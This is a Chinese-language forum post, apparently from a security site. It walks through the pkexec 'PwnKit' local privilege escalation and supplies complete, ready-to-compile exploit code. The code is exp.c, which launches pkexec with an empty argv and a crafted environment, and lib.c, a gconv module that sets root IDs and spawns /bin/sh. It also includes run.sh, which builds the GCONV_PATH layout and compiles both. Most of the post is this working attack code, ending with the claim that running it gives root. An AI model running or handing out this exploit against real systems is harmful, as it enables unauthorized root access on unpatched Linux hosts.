
## 编写 C 代码

编写 C 代码，用来运行 `pkexec`，将 `argv` 设为 `{ NULL}`，`a_envp` 设置为

```c
char * envp[] = {
  "pwnkitdir",
  "PATH=GCONV_PATH=.",
  "CHARSET=PWNKIT",
  "SHELL=xxx",
  NULL
};
```

并编译运行即可获得 `rootshell`。

## 漏洞验证

### exp.c

```c
#include <stdio.h>
#include <unistd.h>
int main(int argc, char **argv)
{
char * const a_argv [] = { NULL};
char * const a_envp[] = {
"pwnkitdir",
"PATH=GCONV_PATH=.",
"CHARSET=PWNKIT",
"SHELL=xxx",
NULL
};
execve("/usr/local/bin/pkexec", a_argv, a_envp);
}
```

### lib.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
static void __attribute__ ((constructor)) exp(void);
static void exp(void)
{
setuid(0); seteuid(0); setgid(0); setegid(0);
static char *a_argv[] = {
"sh", NULL };
static char *a_envp[] = {
"PATH=/bin:/usr/bin:/sbin", NULL };
execve("/bin/sh", a_argv, a_envp);
}
```

### run.sh

```sh
mkdir 'GCONV_PATH=.'
touch 'GCONV_PATH=./pwnkitdir'
chmod 777 'GCONV_PATH=./pwnkitdir'
mkdir pwnkitdir
touch pwnkitdir/gconv-modules
echo "module UTF-8// PWNKIT// pwnkit 1" >> pwnkitdir/gconv-modules
gcc -fPIC -shared lib.c -o pwnkitdir/pwnkit.so
gcc exp.c -o exp
```

运行 `run.sh` 完成 `exp` 利用的前置环境搭建，切换为普通用户：

![](https://bbs.kanxue.com/upload/attach/202308/929564_TCVNFHD2V3SRBZ3.png)

运行 `exp`，完成提权。

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

[#漏洞分析](https://bbs.kanxue.com/forum-150-1-153.htm)

[#Linux](https://bbs.kanxue.com/forum-150-1-161.htm)
